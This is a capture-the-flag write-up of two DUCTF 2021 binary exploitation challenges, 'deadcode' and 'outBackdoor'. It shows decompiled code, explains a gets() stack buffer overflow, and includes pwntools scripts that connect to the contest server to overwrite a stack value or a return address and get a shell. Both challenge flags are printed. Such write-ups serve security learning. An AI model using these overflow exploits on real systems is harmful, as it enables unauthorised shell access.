# CHALLENGE NAME: deadcode

## DESCRIPTION

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

## ATTACHMENT

`nc pwn-2021.duc.tf 31916`

[deadcode](https://play.duc.tf/files/e2160dca2cee7fa1fd1df1a727298cfa/deadcode?token=eyJ1c2VyX2lkIjoyNDM3LCJ0ZWFtX2lkIjoxNDA4LCJmaWxlX2lkIjozMX0.YVHO3A.piCDy3mKtwFP0JCZej5NUTvtxJg)

## DECOMPILED CODE

I used IDA pro to decompiled code.

### Assembly code
```assembly
.text:0000000000401195 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000401195                 public main
.text:0000000000401195 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000401195
.text:0000000000401195 var_20          = byte ptr -20h
.text:0000000000401195 var_8           = qword ptr -8
.text:0000000000401195
.text:0000000000401195 ; __unwind {
.text:0000000000401195                 push    rbp
.text:0000000000401196                 mov     rbp, rsp
.text:0000000000401199                 sub     rsp, 20h
.text:000000000040119D                 mov     [rbp+var_8], 0
.text:00000000004011A5                 mov     eax, 0
.text:00000000004011AA                 call    buffer_init
.text:00000000004011AF                 lea     rdi, s          ; "\nI'm developing this new application i"...
.text:00000000004011B6                 call    _puts
.text:00000000004011BB                 lea     rdi, aWhatFeaturesWo ; "\nWhat features would you like to see i"...
.text:00000000004011C2                 call    _puts
.text:00000000004011C7                 lea     rax, [rbp+var_20]
.text:00000000004011CB                 mov     rdi, rax
.text:00000000004011CE                 mov     eax, 0
.text:00000000004011D3                 call    _gets
.text:00000000004011D8                 mov     eax, 0DEADC0DEh
.text:00000000004011DD                 cmp     [rbp+var_8], rax
.text:00000000004011E1                 jnz     short loc_401200
.text:00000000004011E3                 lea     rdi, aMaybeThisCodeI ; "\n\nMaybe this code isn't so dead..."
.text:00000000004011EA                 call    _puts
.text:00000000004011EF                 lea     rdi, command    ; "/bin/sh"
.text:00000000004011F6                 mov     eax, 0
.text:00000000004011FB                 call    _system
.text:0000000000401200
.text:0000000000401200 loc_401200:                             ; CODE XREF: main+4C↑j
.text:0000000000401200                 mov     eax, 0
.text:0000000000401205                 leave
.text:0000000000401206                 retn
.text:0000000000401206 ; } // starts at 401195
```

### Pseudocode

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[24]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = 0LL;
  buffer_init(argc, argv, envp);
  puts("\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(v4);
  if ( v5 == 3735929054LL )
  {
    puts("\n\nMaybe this code isn't so dead...");
    system("/bin/sh");
  }
  return 0;
}
```
## METHODOLOGY

Look at the code, I've seen the `system("/bin/sh")` command that we can manipulate and find flags. It will be executed when `v5` = `3735929054`. However, at the beginning of the code, `v5` has been set to `0`. So this will not be executed when the program is running. But, before the code of the `if`, I see the function `gets(v4)`. This function does not manage the input length. So we can take advantage of this function to override the value of `v5` in stack. 

So, this is `buffer overflow`.

## EXPLOIT

We can see in the decompiled code.
```
char v4[24]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-8h]
```
Based on that, we can draw the stack as follows

![image](https://user-images.githubusercontent.com/84057292/134934822-cd774571-d30c-4b69-86df-596762c65402.png)

### Exploit code

```python
from pwn import *

r = remote('pwn-2021.duc.tf', 31916)

print(r.recvline())
print(r.recv())

payload = '0' * 24
payload += "\xDE\xC0\xAD\xDE"
r.sendline(payload)

print(r.recv())
r.interactive()
```

### Exploit

![image](https://user-images.githubusercontent.com/84057292/134930295-adb54661-e340-4c78-abb6-b9a0e5f21b64.png)

So, I got the flag

## FLAG

`DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`

# CHALLENGE NAME: outBackdoor

## DESCRIPTION

Fool me once, shame on you. Fool me twice, shame on me.

## ATTACHMENT

`nc pwn-2021.duc.tf 31921`

[outBackdoor](https://play.duc.tf/files/0139581c42431ba4e339f9936a221977/outBackdoor?token=eyJ1c2VyX2lkIjoyNDM3LCJ0ZWFtX2lkIjoxNDA4LCJmaWxlX2lkIjo4Mn0.YVIBNQ.laGiyP5rvNZMxbtC48X5JKBv2LY)

## DECOMPILED CODE

I used IDA pro to decompiled code.

### Assembly code
```assembly
.text:0000000000401195
.text:0000000000401195 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000401195                 public main
.text:0000000000401195 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000401195
.text:0000000000401195 var_10          = byte ptr -10h
.text:0000000000401195
.text:0000000000401195 ; __unwind {
.text:0000000000401195                 push    rbp
.text:0000000000401196                 mov     rbp, rsp
.text:0000000000401199                 sub     rsp, 10h
.text:000000000040119D                 mov     eax, 0
.text:00000000004011A2                 call    buffer_init
.text:00000000004011A7                 lea     rdi, s          ; "\nFool me once, shame on you. Fool me t"...
.text:00000000004011AE                 call    _puts
.text:00000000004011B3                 lea     rdi, aSeriouslyThoug ; "\nSeriously though, what features would"...
.text:00000000004011BA                 call    _puts
.text:00000000004011BF                 lea     rax, [rbp+var_10]
.text:00000000004011C3                 mov     rdi, rax
.text:00000000004011C6                 mov     eax, 0
.text:00000000004011CB                 call    _gets
.text:00000000004011D0                 mov     eax, 0
.text:00000000004011D5                 leave
.text:00000000004011D6                 retn
.text:00000000004011D6 ; } // starts at 401195
.text:00000000004011D6 main            endp
```

### Pseudocode

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  buffer_init(argc, argv, envp);
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(v4);
  return 0;
}
```
## METHODOLOGY

Look at the code, I see the function `gets(v4)`. This function does not manage the input length. So we can take advantage of this function to override something in stack. But the code does not have any special to exploit. So, I go around all function of this program that IDA has found. I found a strange function named outBackdoor.

<p align = center>
  <img src="https://user-images.githubusercontent.com/84057292/134958594-d0340e6b-716c-4df1-90cc-de7a5878ce2c.png">
</p>

In this function also has the command `/bin/sh` like previous chall.

```assembly
.text:00000000004011D7                 public outBackdoor
.text:00000000004011D7 outBackdoor     proc near
.text:00000000004011D7 ; __unwind {
.text:00000000004011D7                 push    rbp
.text:00000000004011D8                 mov     rbp, rsp
.text:00000000004011DB                 lea     rdi, aWWWaitWhoPutTh ; "\n\nW...w...Wait? Who put this backdoor"...
.text:00000000004011E2                 call    _puts
.text:00000000004011E7                 lea     rdi, command    ; "/bin/sh"
.text:00000000004011EE                 mov     eax, 0
.text:00000000004011F3                 call    _system
.text:00000000004011F8                 nop
.text:00000000004011F9                 pop     rbp
.text:00000000004011FA                 retn
.text:00000000004011FA ; } // starts at 4011D7
.text:00000000004011FA outBackdoor     endp
```
So, this is `buffer overflow`. We have to override `Return Address` of `gets` function for move to `outBackdoor` function.

## EXPLOIT

We can see in the decompiled code.
```
char v4[16]; // [rsp+0h] [rbp-10h] BYREF
```
Based on that, we can draw the stack as follows

![image](https://user-images.githubusercontent.com/84057292/134959901-bd52a1cc-66a0-4a37-965f-d05bb07c8dd3.png)


### Exploit code

```python
from pwn import *

r = remote('pwn-2021.duc.tf', 31921)

print(r.recvline())
print(r.recv())

payload = '0' * 24
payload += "\xE7\x11\x40\x00\x00\x00\x00\x00"

r.sendline(payload)

print(r.recv())
r.interactive()

```

### Exploit

![image](https://user-images.githubusercontent.com/84057292/134961034-b3a59b82-098b-4918-b85a-6f7a2f1fb046.png)

So, I got the flag

## FLAG

`DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}`

